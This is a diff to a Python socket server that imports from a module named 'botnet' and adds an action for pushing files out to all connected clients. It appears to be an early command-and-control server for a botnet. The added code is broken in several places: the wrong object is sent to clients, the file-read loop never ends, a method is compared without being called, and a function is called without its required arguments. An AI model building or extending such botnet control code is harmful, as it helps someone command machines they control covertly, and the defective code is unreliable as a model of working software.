@@ -5,9 +5,13 @@ import queue
 import time
 
 from h11 import ConnectionClosed
+from Downloader import Download
+
+from botnet import ALL_ACTIONS
 
 CLIENT_TIMEOUT =  30 # seconds
 MAXIMUM_CLIENTS = 100 # seconds
+SEND_FILE_BUFFER = 5120 # 5kb
 
 # Common parts
 cwd = os.getcwd()
@@ -20,6 +24,9 @@ from Communicator import COMMUNICATOR
 class SERVER:
     def __init__(self, ip, port):
         self.clients = {}
+        self.ACTIONS = {
+            'UPLOAD': self.SendFile,
+        }
 
         sock = socket.socket()
         sock.bind((ip, port))
@@ -28,6 +35,7 @@ class SERVER:
         sock.listen(MAXIMUM_CLIENTS)
 
         self.sock = COMMUNICATOR(sock)
+        self.DataToSend = queue.Queue()
 
     # Add a client to the list
     def UpdateClient(self, addr, conn):
@@ -54,14 +62,47 @@ class SERVER:
             else:
                 break
 
-    def MainLoop(self):
+    def SendToClients(self, data):
+        for i in self.clients:
+            sock = i[0]
+            sock.send(data)
+
+    def MainLoop(self, in_, out_):
         while True:
             os.system('cls')
             self.AcceptClients()
             self.ClientTimeouts()
-            print(self.clients)
+            if out_.qsize == 0:
+                out_.put(self.clients)
+            
+
+            data = self.DataToSend.get(False)
+            self.SendToClients(self.DataToSend)
+            
+
+    ####### ACTIONS #######
+
+    # This allows us to send files
+    def _SendFile(self, path, q):
+        path = path.replace('\\', '/') # make sure path is in linux form
+        name = path.split('/')[-1] # get the name
+        size = os.path.getsize(path)
+        #           0       1       2
+        q.put(f'DOWNLOAD "{name}" {size}\n') # \n is for detecting when the header stop
+
+        f = open(path, 'r')
+        while f:
+            data = f.read(SEND_FILE_BUFFER)
+            q.put(data)
+        f.close()
+
+    # Laucher to send files
+    def SendFile(self, path):
+        _thread.start_new_thread(self._SendFile(path, self.DataToSend))
 
 
 if __name__ == "__main__":
     s = SERVER('127.0.0.1', 8080)
+    in_ = queue.Queue()
+    out_ = queue.Queue()
     s.MainLoop()
